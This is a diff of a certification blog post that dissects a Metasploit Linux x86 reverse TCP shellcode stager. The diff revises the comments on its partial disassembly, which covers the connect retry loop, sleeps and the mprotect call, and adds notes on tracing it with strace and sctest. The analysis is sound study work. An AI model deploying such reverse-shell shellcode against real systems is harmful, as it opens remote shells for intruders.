@@ -443,7 +443,7 @@ No encoder specified, outputting raw payload
 Payload size: 123 bytes
 
 00000000  6A0A              push byte +0xa
-00000002  5E                pop esi
+00000002  5E                pop esi                 ; 10 connection attempts
 00000003  31DB              xor ebx,ebx
 00000005  F7E3              mul ebx
 00000007  53                push ebx                ; socket protocol: 0
@@ -467,8 +467,8 @@ Payload size: 123 bytes
 00000028  43                inc ebx                 ; SYS_CONNECT
 00000029  CD80              int 0x80                ; Execute syscall
 0000002B  85C0              test eax,eax            ; Test if connect() returned success
-0000002D  7919              jns 0x48                ; If not zero, jump to 0x48 and exit program
-0000002F  4E                dec esi                 ; Decrease edi
+0000002D  7919              jns 0x48                ; If not zero, jump to 00000048
+0000002F  4E                dec esi                 ; Decrease esi
 00000030  743D              jz 0x6f                 ; If zero, exit program
 00000032  68A2000000        push dword 0xa2
 00000037  58                pop eax                 ; syscall sys_nanosleep 162
@@ -478,11 +478,11 @@ Payload size: 123 bytes
 0000003E  31C9              xor ecx,ecx             ; last argument for sys_nanosleep is zero
 00000040  CD80              int 0x80                ; Execute syscall
 00000042  85C0              test eax,eax
-00000044  79BD              jns 0x3                 ; if zero jump to 00000046
-00000046  EB27              jmp short 0x6f          ; if not zero exit program
-00000048  B207              mov dl,0x7              ; 7
+00000044  79BD              jns 0x3                 ; if not zero jump to 00000003
+00000046  EB27              jmp short 0x6f          ; exit program
+00000048  B207              mov dl,0x7              ; reverse shell success fully connected. 7 -> read,write,execute
 0000004A  B900100000        mov ecx,0x1000          ; size_t len 4096
-0000004F  89E3              mov ebx,esp
+0000004F  89E3              mov ebx,esp             ; *addr = points to top of the stack
 00000051  C1EB0C            shr ebx,0xc             ; shift ebx 12 bytes to the right
 00000054  C1E30C            shl ebx,0xc             ; shift ebx 12 bytes to the left
 00000057  B07D              mov al,0x7d             ; sys_mprotect 125
@@ -503,6 +503,16 @@ Payload size: 123 bytes
 00000079  CD80              int 0x80                ; Execute syscall
 ```
 
+Compared to other common reverse shell payloads, this one is a little bit different because it performs error checking after each syscall. If an error is detected, simply exit the program. In addition to error checking, it contains a few other features as well. The program will try to connect 10 times before it exists. Between each connection attempt it will also sleep for 5 seconds. Once a connection as been made, `mprotect()` is called marking the top of the stack readable, writable and executable for the process's memory pages.
+
+We can dynamically analyse the payload using `strace` to see which system calls are being made. Because this payload expects shellcode as input, I simply used metasploit's `exploit/multi/handler` to listen for connections. The image below shows `strace` on the left and metasploit on the right.
+
+<center>
+![reverse_shell_tcp.png](reverse_shell_tcp.png)
+</center>
+
+The green line shows the shellcode received from metasploit.
+
 Another tool we can use for analysing shellcode is [sctest](https://www.aldeid.com/wiki/Libemu/sctest) which can be used for emulating shellcode. Running the following commands will create a graphical image showing which syscalls are being made.
 
 ```
@@ -512,7 +522,9 @@ dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ dot reverse_tcp.dot -Tpng -o revers
 
 The generated image:
 
+<center>
 ![reverse_tcp.png](reverse_tcp.png)
+</center>
 
 In addition to generating images, `sctest` will also generate some C code based on the structures used by each syscall. For example, the C code below corresponds to creating a `socket` and then calling the `connect` syscall. We can also see the configured port and IP address.
 
@@ -537,7 +549,7 @@ int connect (
 ) =  0;
 ```
 
-However, for some reason `sctest` does not show the last instructions on my machine. Therefore I'll have to manually debug everything after address `00000029` in the assembly output.
+That's it, this was a fun payload to disect :)
 
 ---
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
